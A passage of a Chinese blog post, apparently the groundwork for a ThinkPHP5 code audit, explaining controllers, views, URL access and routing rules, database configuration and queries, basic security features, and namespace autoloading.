+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611152045993.png" alt="image-20240611152045993"></p>
+<p>因为默认的URL访问是不区分大小写的，全部都会转换为小写的控制器名，除非你在应用配置文件中，设置了关闭url自动转换如下：</p>
+<pre><code class="hljs php"><span class="hljs-string">'url_convert'</span> =&gt; <span class="hljs-literal">false</span>,</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611153447321.png" alt="image-20240611153447321"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611153508495.png" alt="image-20240611153508495"></p>
+<p>一般来说，<strong>ThinkPHP的控制器是一个类</strong>，而操作则是控制器类的一个公共方法。控制器类可以包括多个操作方法，但如果你的操作方法是<code>protected</code>或者<code>private</code>类型的话，是无法直接通过URL访问到该操作的，也就是说只有<code>public</code>类型的操作方法才是可以通过URL访问的。</p>
+<p>例如：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span>{
+	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)    </span>{        
+		<span class="hljs-keyword">return</span> <span class="hljs-string">'hello,thinkphp!'</span>;    
+	}    
+	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)    </span>{        
+		<span class="hljs-keyword">return</span> <span class="hljs-string">'这是一个测试方法!'</span>;    
+	}    
+	<span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello2</span>(<span class="hljs-params"></span>)    </span>{       
+		<span class="hljs-keyword">return</span> <span class="hljs-string">'只是protected方法!'</span>;   
+	}    
+	<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello3</span>(<span class="hljs-params"></span>)    </span>{       
+		<span class="hljs-keyword">return</span> <span class="hljs-string">'这是private方法!'</span>;    
+	}
+}</code></pre>
+<p>当我们访问如下URL地址的时候，前面两个是正常访问，后面两个则会显示异常</p>
+<pre><code class="hljs scss">http://serverName/index.php/index/index/hello
+http://serverName/index.php/index/index/test
+http://serverName/index.php/index/index/hello2
+http://serverName/index.php/index/index/hello3</code></pre>
+<h2 id="视图">视图</h2>
+<p>现在我们在给控制器添加视图文件功能，我们在<code>application/index</code>目录下面创建一个<code>view</code>目录，然后添加模板文件<code>view/index/hello.html</code>（注意大小写），我们添加模板内容如下：</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>hello {$name}<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+        hello, {$name}!
+    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+<p>要输出视图，必须在控制器方法中进行模板渲染输出操作，现在修改控制器类如下：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>{    
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">'thinkphp'</span></span>)    </span>{        
+        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">'name'</span>, <span class="hljs-variable">$name</span>);        
+        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();    
+    }
+}</code></pre>
+<p><code>Index</code>控制器类继承了 <code>think\Controller</code>类之后，我们可以直接使用封装好的<code>assign</code>和<code>fetch</code>方法进行模板变量赋值和渲染输出。</p>
+<p><code>fetch</code>方法中我们没有指定任何模板，所以按照系统默认的规则（<strong>视图目录/控制器/操作方法</strong>）输出了<code>view/index/hello.html</code>模板文件。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611155356817.png" alt="image-20240611155356817"></p>
+<p>接下来，我们在浏览器访问</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611155345424.png" alt="image-20240611155345424"></p>
+<h2 id="urlamp路由">URL&amp;路由</h2>
+<p>我们在文章开始部分提过一嘴</p>
+<h3 id="url访问">URL访问</h3>
+<p>一个标准的<code>URL</code>访问格式（<strong>pathinfo模式</strong>）：</p>
+<pre><code class="hljs scss">http://domainName/index.php/模块/控制器/操作/[参数名/参数值...]</code></pre>
+<p>其中<code>index.php</code>就称之为应用的入口文件（入口文件可以被隐藏,<a target="_blank" rel="noopener" href="https://www.kancloud.cn/thinkphp/thinkphp5_quickstart/478281">参考</a>）。</p>
+<blockquote>
+<p>模块在ThinkPHP中的概念其实就是应用目录下面的子目录，而官方的规范是目录名小写，因此模块全部采用小写命名，无论URL是否开启大小写转换，模块名都会强制小写。</p>
+</blockquote>
+<p>如果你的控制器是驼峰的，例如定义一个HelloWorld控制器（<code>application/index/controller/HelloWorld.php</code>），正确的URL访问地址（该地址可以使用url方法生成）应该是：</p>
+<pre><code class="hljs perl">http:<span class="hljs-regexp">//s</span>ervername/index.php/<span class="hljs-keyword">index</span>/hello_world/<span class="hljs-keyword">index</span></code></pre>
+<p>如果使用</p>
+<pre><code class="hljs perl">http:<span class="hljs-regexp">//s</span>ervername/index.php/<span class="hljs-keyword">index</span>/HelloWorld/<span class="hljs-keyword">index</span></code></pre>
+<p>将会报错，并提示<code>Helloworld</code>控制器类不存在。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611155804607.png" alt="image-20240611155804607"></p>
+<p>如果希望严格区分大小写访问（这样就可以支持驼峰法进行控制器访问），可以在应用配置文件中设置（前文已经提到过）：</p>
+<pre><code class="hljs bash">// 关闭URL自动转换（支持驼峰访问控制器）<span class="hljs-string">'url_convert'</span> =&gt; <span class="hljs-literal">false</span>,</code></pre>
+<p>关闭URL自动转换之后，必须使用下面的URL地址访问（控制器名称必须严格使用控制器类的名称，不包含控制器后缀）：</p>
+<pre><code class="hljs perl">http:<span class="hljs-regexp">//s</span>ervername/index.php/<span class="hljs-keyword">index</span>/HelloWorld/<span class="hljs-keyword">index</span>
+http:<span class="hljs-regexp">//s</span>ervername/index.php/<span class="hljs-keyword">index</span>/hello_world/<span class="hljs-keyword">index</span></code></pre>
+<p>如果你的服务器环境不支持<code>pathinfo</code>方式的URL访问，可以使用<strong>兼容方式</strong>，例如：</p>
+<pre><code class="hljs scss">http://servername/index.php?s=/index/Index/index</code></pre>
+<p>其中变量<code>s</code>的名称的可以配置的。</p>
+<blockquote>
+<p>5.0不再支持普通的URL访问方式，所以下面的访问是无效的，你会发现无论输入什么，访问的都是默认的控制器和操作_</p>
+</blockquote>
+<pre><code class="hljs scss">http://servername/index.php?m=index&amp;c=Index&amp;a=hello</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611160531896.png" alt="image-20240611160531896"></p>
+<h3 id="参数传入">参数传入</h3>
+<p>上面我们使用了，如下方式传参</p>
+<pre><code class="hljs scss">http://domainName/index.php/模块/控制器/操作/[参数名<span class="hljs-number">1</span>/参数值<span class="hljs-number">1</span>/参数名<span class="hljs-number">2</span>/参数值<span class="hljs-number">2</span>...]</code></pre>
+<p>除此之外，还可以使用</p>
+<pre><code class="hljs scss">http://domainName/index.php/模块/控制器/操作?参数<span class="hljs-number">1</span>=值<span class="hljs-number">1</span>&amp;参数<span class="hljs-number">2</span>=值<span class="hljs-number">2</span>...</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611161344460.png" alt="image-20240611161344460"></p>
+<p>还可以进一步对URL地址做简化，前提就是我们必须明确参数的顺序代表的变量，我们更改下URL参数的获取方式，把应用配置文件中的<code>url_param_type</code>参数的值修改如下：</p>
+<pre><code class="hljs bash">// 按照参数顺序获取<span class="hljs-string">'url_param_type'</span> =&gt; 1,</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611162020822.png" alt="image-20240611162020822"></p>
+<p>现在，URL的参数传值方式就变成了严格按照操作方法的变量定义顺序来传值了，也就是说我们必须使用下面的URL地址访问才能正确传入<code>name</code>和<code>city</code>参数到<code>hello</code>方法：</p>
+<pre><code class="hljs scss">http://servername/index.php/index/HelloWorld/index/hybcx/hacker</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611162232455.png" alt="image-20240611162232455"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611162240226.png" alt="image-20240611162240226"></p>
+<h3 id="自定义定义路由">自定义定义路由</h3>
+<p><strong>ThinkPHP5</strong> 中支持 <strong>5种</strong> 路由地址方式定义：</p>
+<table>
+<thead>
+<tr>
+<th>定义方式</th>
+<th>定义格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>方式1：路由到模块/控制器</td>
+<td>‘[模块/控制器/操作]?额外参数1=值1&amp;额外参数2=值2…’</td>
+</tr>
+<tr>
+<td>方式2：路由到重定向地址</td>
+<td>‘外部地址’（默认301重定向） 或者 [‘外部地址’,‘重定向代码’]</td>
+</tr>
+<tr>
+<td>方式3：路由到控制器的方法</td>
+<td>‘@[模块/控制器/]操作’</td>
+</tr>
+<tr>
+<td>方式4：路由到类的方法</td>
+<td>‘\完整的命名空间类::静态方法’ 或者 ‘\完整的命名空间类@动态方法’</td>
+</tr>
+<tr>
+<td>方式5：路由到闭包函数</td>
+<td>闭包函数定义（支持参数传入）</td>
+</tr>
+</tbody>
+</table>
+<p>我们可以通过在路由定义文件（<code>application/route.php</code>）里面添加一些路由规则，来简化URL访问</p>
+<p>例如：</p>
+<pre><code class="hljs php"><span class="hljs-keyword">return</span> [
+    <span class="hljs-comment">// 添加路由规则 路由到 index控制器的hello操作方法    </span>
+    <span class="hljs-string">'hello/[:name]'</span> =&gt; <span class="hljs-string">'index/index/hello'</span>,
+];</code></pre>
+<p>该路由规则表示所有<code>hello</code>开头的并且带参数的访问都会路由到<code>index</code>控制器的<code>hello</code>操作方法。</p>
+<p>路由之前的URL访问地址为：</p>
+<pre><code class="hljs scss">http://servername/index/index/hello/name/thinkphp</code></pre>
+<p>定义路由后就只能访问下面的URL地址</p>
+<pre><code class="hljs scss">http://servername/hello/thinkphp</code></pre>
+<p>tips：定义路由规则后，原来的URL地址将会失效，变成非法请求。</p>
+<p>我们还可以约束路由规则的请求类型或者URL后缀之类的条件，例如：</p>
+<pre><code class="hljs php"><span class="hljs-keyword">return</span> [    
+	<span class="hljs-comment">// 定义路由的请求类型和后缀    </span>
+    <span class="hljs-string">'hello/[:name]'</span> =&gt; [<span class="hljs-string">'index/hello'</span>, [<span class="hljs-string">'method'</span> =&gt; <span class="hljs-string">'get'</span>, <span class="hljs-string">'ext'</span> =&gt; <span class="hljs-string">'html'</span>]],
+];</code></pre>
+<p>上面定义的路由规则限制了必须是<code>get</code>请求，而且后缀必须是<code>html</code>的，所以下面的访问地址：</p>
+<pre><code class="hljs php">http:<span class="hljs-comment">//servername/hello // 无效</span>
+http:<span class="hljs-comment">//servername/hello.html // 有效</span>
+http:<span class="hljs-comment">//servername/hello/thinkphp // 无效</span>
+http:<span class="hljs-comment">//servername/hello/thinkphp.html // 有效</span></code></pre>
+<h4 id="路由到模块控制器">路由到模块/控制器</h4>
+<pre><code class="hljs php"><span class="hljs-comment">// 路由到默认或者绑定模块</span>
+<span class="hljs-string">'blog/:id'</span>=&gt;<span class="hljs-string">'blog/read'</span>, 				<span class="hljs-comment"># 意思是如果访问blog/5，就会调用blog/read并传入参数id=5,下面同理</span>
+<span class="hljs-comment">// 路由到index模块</span>
+<span class="hljs-string">'blog/:id'</span>=&gt;<span class="hljs-string">'index/blog/read'</span>,
+----------------------------------------------
+<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Blog</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-string">'read:'</span>.<span class="hljs-variable">$id</span>;
+    }
+}</code></pre>
+<p>还支持多级控制器：</p>
+<pre><code class="hljs php"><span class="hljs-comment">//多级控制器方式</span>
+<span class="hljs-string">'blog/:id'</span>=&gt;<span class="hljs-string">'index/group.blog/read'</span>
+----------------------------------------------
+<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>\<span class="hljs-title class_">group</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Blog</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-string">'read:'</span>.<span class="hljs-variable">$id</span>;
+    }
+}</code></pre>
+<h4 id="路由到重定向地址">路由到重定向地址</h4>
+<p>举个例子，如果我们希望<code>avatar/123</code>重定向到/member/avatar/id/123_small的话，只能使用：</p>
+<pre><code class="hljs scss">'avatar/:id<span class="hljs-string">'=&gt;'</span>/member/avatar/id/:id_small<span class="hljs-string">'</span>
+<span class="hljs-string"></span>
+<span class="hljs-string"># 区别于 '</span>avatar/:id<span class="hljs-string">'=&gt;'</span>avatar/read<span class="hljs-string">' ，这个不是采用301重定向的。重定向的外部地址必须以“/”或者http开头的地址。</span></code></pre>
+<p>路由地址采用重定向地址的话，如果要引用动态变量，直接使用动态变量即可。采用重定向到外部地址通常对网站改版后的URL迁移过程非常有用，例如：</p>
+<pre><code class="hljs scss">'blog/:id<span class="hljs-string">'=&gt;'</span>http://blog.thinkphp.cn/read/:id<span class="hljs-string">'</span></code></pre>
+<p>表示当前网站（可能是<a target="_blank" rel="noopener" href="http://thinkphp.cn/">http://thinkphp.cn</a> ）的 blog/123地址会直接重定向到 <a target="_blank" rel="noopener" href="http://blog.thinkphp.cn/read/123%E3%80%82">http://blog.thinkphp.cn/read/123。</a></p>
+<h4 id="路由到控制器的方法">路由到控制器的方法</h4>
+<pre><code class="hljs php"><span class="hljs-string">'blog/:id'</span>=&gt;<span class="hljs-string">'@index/blog/read'</span>,
+-------------------------------------
+会执行 <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">action</span>(<span class="hljs-string">'index/blog/read'</span>);
+相当于直接调用 \app\index\controller\blog类的read方法。
+<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Blog</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-string">'read:'</span>.<span class="hljs-variable">$id</span>;
+    }
+}</code></pre>
+<h4 id="路由到类的方法">路由到类的方法</h4>
+<pre><code class="hljs php"><span class="hljs-string">'blog/:id'</span>=&gt;<span class="hljs-string">'\app\index\service\Blog@read'</span>（动态方法）
+或
+<span class="hljs-string">'blog/:id'</span>=&gt;<span class="hljs-string">'\app\index\service\Blog::read'</span>,（静态方法）
+
+执行的是 \app\index\service\Blog类的read方法。</code></pre>
+<p>tips：<code>'default_return_type'=&gt;'json'</code>修改config.php下的这个配置，可以使输出自动进行数据转换处理。<code>Response</code>类会统一处理。</p>
+<h2 id="数据库">数据库</h2>
+<blockquote>
+<p>ThinkPHP内置了抽象数据库访问层，把不同的数据库操作封装起来，我们只需要使用公共的Db类进行操作，而无需针对不同的数据库写不同的代码和底层实现，Db类会自动调用相应的数据库驱动来处理。采用PDO方式，目前包含了Mysql、SqlServer、PgSQL、Sqlite等数据库的支持。</p>
+</blockquote>
+<p>数据库配置方式有很多，常用的配置方式是在应用目录或者模块目录下面的<code>database.php</code>中添加下面的配置参数：</p>
+<pre><code class="hljs php"><span class="hljs-keyword">return</span> [    
+    <span class="hljs-comment">// 数据库类型    </span>
+    <span class="hljs-string">'type'</span>            =&gt; <span class="hljs-string">'mysql'</span>,    
+    <span class="hljs-comment">// 服务器地址    </span>
+    <span class="hljs-string">'hostname'</span>        =&gt; <span class="hljs-string">'127.0.0.1'</span>,    
+    <span class="hljs-comment">// 数据库名    </span>
+    <span class="hljs-string">'database'</span>        =&gt; <span class="hljs-string">'thinkphp'</span>,    
+    <span class="hljs-comment">// 用户名    </span>
+    <span class="hljs-string">'username'</span>        =&gt; <span class="hljs-string">'root'</span>,    
+    <span class="hljs-comment">// 密码    </span>
+    <span class="hljs-string">'password'</span>        =&gt; <span class="hljs-string">'root'</span>,    
+    <span class="hljs-comment">// 端口    </span>
+    <span class="hljs-string">'hostport'</span>        =&gt; <span class="hljs-string">'3306'</span>,    
+    <span class="hljs-comment">// 连接dsn    </span>
+    <span class="hljs-string">'dsn'</span>             =&gt; <span class="hljs-string">''</span>,    
+    <span class="hljs-comment">// 数据库连接参数    </span>
+    <span class="hljs-string">'params'</span>          =&gt; [],    
+    <span class="hljs-comment">// 数据库编码默认采用utf8    </span>
+    <span class="hljs-string">'charset'</span>         =&gt; <span class="hljs-string">'utf8'</span>,    
+    <span class="hljs-comment">// 数据库表前缀    </span>
+    <span class="hljs-string">'prefix'</span>          =&gt; <span class="hljs-string">''</span>,    
+    <span class="hljs-comment">// 数据库调试模式    </span>
+    <span class="hljs-string">'debug'</span>           =&gt; <span class="hljs-literal">true</span>,    
+    <span class="hljs-comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)    </span>
+    <span class="hljs-string">'deploy'</span>          =&gt; <span class="hljs-number">0</span>,    
+    <span class="hljs-comment">// 数据库读写是否分离 主从式有效    </span>
+    <span class="hljs-string">'rw_separate'</span>     =&gt; <span class="hljs-literal">false</span>,    
+    <span class="hljs-comment">// 读写分离后 主服务器数量    </span>
+    <span class="hljs-string">'master_num'</span>      =&gt; <span class="hljs-number">1</span>,    
+    <span class="hljs-comment">// 指定从服务器序号    </span>
+    <span class="hljs-string">'slave_no'</span>        =&gt; <span class="hljs-string">''</span>,    
+    <span class="hljs-comment">// 是否严格检查字段是否存在    </span>
+    <span class="hljs-string">'fields_strict'</span>   =&gt; <span class="hljs-literal">true</span>,    
+    <span class="hljs-comment">// 数据集返回类型    </span>
+    <span class="hljs-string">'resultset_type'</span>  =&gt; <span class="hljs-string">'array'</span>,    
+    <span class="hljs-comment">// 自动写入时间戳字段    </span>
+    <span class="hljs-string">'auto_timestamp'</span>  =&gt; <span class="hljs-literal">false</span>,    
+    <span class="hljs-comment">// 时间字段取出后的默认时间格式    </span>
+    <span class="hljs-string">'datetime_format'</span> =&gt; <span class="hljs-string">'Y-m-d H:i:s'</span>,    
+    <span class="hljs-comment">// 是否需要进行SQL性能分析    </span>
+    <span class="hljs-string">'sql_explain'</span>     =&gt; <span class="hljs-literal">false</span>,];</code></pre>
+<p>配置了数据库连接信息后，我们就可以直接使用数据库运行原生SQL操作了，支持<code>query</code>（查询操作）和<code>execute</code>（写入操作）方法，并且支持参数绑定。</p>
+<pre><code class="hljs php"><span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">'select * from think_user where id=?'</span>,[<span class="hljs-number">8</span>]);
+<span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-string">'insert into think_user (id, name) values (?, ?)'</span>,[<span class="hljs-number">8</span>,<span class="hljs-string">'thinkphp'</span>]);</code></pre>
+<p>也支持命名占位符绑定，例如：</p>
+<pre><code class="hljs php"><span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">'select * from think_user where id=:id'</span>,[<span class="hljs-string">'id'</span>=&gt;<span class="hljs-number">8</span>]);
+<span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-string">'insert into think_user (id, name) values (:id, :name)'</span>,[<span class="hljs-string">'id'</span>=&gt;<span class="hljs-number">8</span>,<span class="hljs-string">'name'</span>=&gt;<span class="hljs-string">'thinkphp'</span>]);</code></pre>
+<p>可以使用多个数据库连接，使用</p>
+<pre><code class="hljs php"><span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-variable">$config</span>)-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">'select * from think_user where id=:id'</span>,[<span class="hljs-string">'id'</span>=&gt;<span class="hljs-number">8</span>]);</code></pre>
+<p>$config是一个单独的数据库配置，支持数组和字符串，也可以是一个数据库连接的配置参数名。</p>
+<p>查询一个数据使用：</p>
+<pre><code class="hljs php"><span class="hljs-comment">// table方法必须指定完整的数据表名</span>
+<span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">'think_user'</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">'id'</span>,<span class="hljs-number">1</span>)-&gt;<span class="hljs-title function_ invoke__">find</span>();</code></pre>
+<p>查询数据集使用：</p>
+<pre><code class="hljs php"><span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">'think_user'</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">'status'</span>,<span class="hljs-number">1</span>)-&gt;<span class="hljs-title function_ invoke__">select</span>();</code></pre>
+<h2 id="安全">安全</h2>
+<p><strong>SQL：</strong></p>
+<p><code>5.0</code>版本的数据操作使用了PDO预处理机制及自动参数绑定功能</p>
+<p><strong>上传：</strong></p>
+<p>网站的上传功能也是一个非常容易被攻击的入口，所以对上传功能的安全检查是尤其必要的。</p>
+<p>系统的<code>think\File</code>提供了文件上传的安全支持，包括对文件后缀、文件类型、文件大小以及上传图片文件的合法性检查，确保你已经在上传操作中启用了这些<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/155159">合法性检查</a>。</p>
+<p>为了方便版本升级，并且保证public目录为唯一的web可访问目录，资源文件可以放到项目之外，例如项目目录为</p>
+<pre><code class="hljs scss">/home/www/thinkphp/</code></pre>
+<p>那么资源目录、上传文件保存的目录</p>
+<pre><code class="hljs scss">/home/www/resource/
+/home/www/resource/upload/</code></pre>
+<h2 id="命令空间">命令空间</h2>
+<p>ThinkPHP5只需要给类库正确定义所在的命名空间，并且命名空间的路径与类库文件的目录一致，那么就可以实现类的自动加载。</p>
+<p>例如，\think\cache\driver\File类的定义为：</p>
+<pre><code class="hljs cpp"><span class="hljs-keyword">namespace</span> think\cache\driver;<span class="hljs-keyword">class</span> <span class="hljs-title class_">File</span>{}</code></pre>
+<p>如果我们实例化该类的话，应该是：</p>
+<pre><code class="hljs cpp">$<span class="hljs-keyword">class</span> = <span class="hljs-keyword">new</span> \think\cache\driver\<span class="hljs-built_in">File</span>();</code></pre>
+<p>系统会自动加载该类对应路径的类文件，其所在的路径是 thinkphp/library/think/cache/driver/File.php。可是为什么路径是在thinkphp/library/think下呢？这就要涉及要另一个概念—根命名空间。</p>
